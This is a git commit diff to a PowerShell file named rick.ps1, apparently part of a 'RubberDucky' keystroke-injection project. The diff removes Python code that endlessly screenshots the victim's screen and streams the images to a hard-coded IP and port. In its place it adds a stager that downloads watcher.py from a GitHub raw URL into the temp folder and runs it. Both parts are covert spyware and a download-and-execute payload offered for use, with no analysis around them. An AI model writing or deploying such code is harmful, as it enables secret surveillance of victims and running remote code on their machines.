5a402e65def961eb626a538d802ea13182d42710
RubberDuckyyyy <lev.marinchenko@gmail.com>
2025-07-25 19:00:54 +0200

    Update rick.ps1

--- rick.ps1
+++ rick.ps1
@@ -1,24 +1,3 @@
-import socket
-import pyautogui
-import io
-from PIL import Image
-
-server_ip = "192.168.1.100"  # <-- Твой IP
-server_port = 9999
-
-while True:
-    # Сделать скриншот
-    screenshot = pyautogui.screenshot()
-
-    # Сжать в JPEG и отправить
-    img_bytes = io.BytesIO()
-    screenshot.save(img_bytes, format='JPEG', quality=50)
-    data = img_bytes.getvalue()
-
-    # Отправка по сети
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        try:
-            s.connect((server_ip, server_port))
-            s.sendall(len(data).to_bytes(4, 'big') + data)
-        except:
-            pass
+$path = "$env:TEMP\watcher.py"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/LEv421/rbduk/main/watcher.py" -OutFile $path
+Start-Process "python" -ArgumentList $path
